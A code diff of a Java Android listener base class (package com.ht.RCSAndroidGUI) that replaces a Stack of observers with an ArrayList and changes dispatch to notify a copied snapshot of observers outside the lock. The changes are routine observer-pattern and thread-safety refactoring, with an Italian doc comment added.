@@ -7,7 +7,9 @@
 
 package com.ht.RCSAndroidGUI.listener;
 
+import java.util.ArrayList;
 import java.util.Iterator;
+import java.util.List;
 import java.util.Stack;
 
 import com.ht.RCSAndroidGUI.event.EventBattery;
@@ -17,27 +19,27 @@ public abstract class Listener<U> {
 	/** The Constant TAG. */
 	private static final String TAG = "Listener";
 
-	protected Stack<Observer<U>> observers;
+	protected List<Observer<U>> observers;
 
 	public Listener() {
-		observers = new Stack<Observer<U>>();
+		observers = new ArrayList<Observer<U>>();
 	}
 
 	public synchronized boolean attach(Observer<U> o) {
 		// Object already in the stack
-		if (observers.search(o) != -1)
+		if (observers.contains(o))
 			return false;
 
 		if (observers.isEmpty()) {
 			start();
 		}
 
-		observers.push(o);
+		observers.add(o);
 		return true;
 	}
 
 	public synchronized void detach(Observer<U> o) {
-		if (observers.empty())
+		if (observers.isEmpty())
 			return;
 
 		observers.remove(o);
@@ -47,17 +49,28 @@ public abstract class Listener<U> {
 		}
 	}
 
-	synchronized int dispatch(U elem){
-		Iterator<Observer<U>> iter = observers.iterator();
-		int result = 0;
-		 
-		while (iter.hasNext()) {
-			result |= iter.next().notification(elem);
+	/**
+	 * dispatch, per ogni observer registrato viene chiamato il notification
+	 * 
+	 * @param elem
+	 * @return
+	 */
+	int dispatch(U elem) {
+		Object[] array;
+		synchronized (this) {
+			array = observers.toArray();
 		}
-		
+		int result = 0;
+
+		for (int i = 0; i < array.length; i++) {
+			Observer<U> observer = (Observer<U>) array[i];
+			result |= observer.notification(elem);
+		}
+
 		return result;
 	}
-	
+
 	protected abstract void start();
+
 	protected abstract void stop();
 }
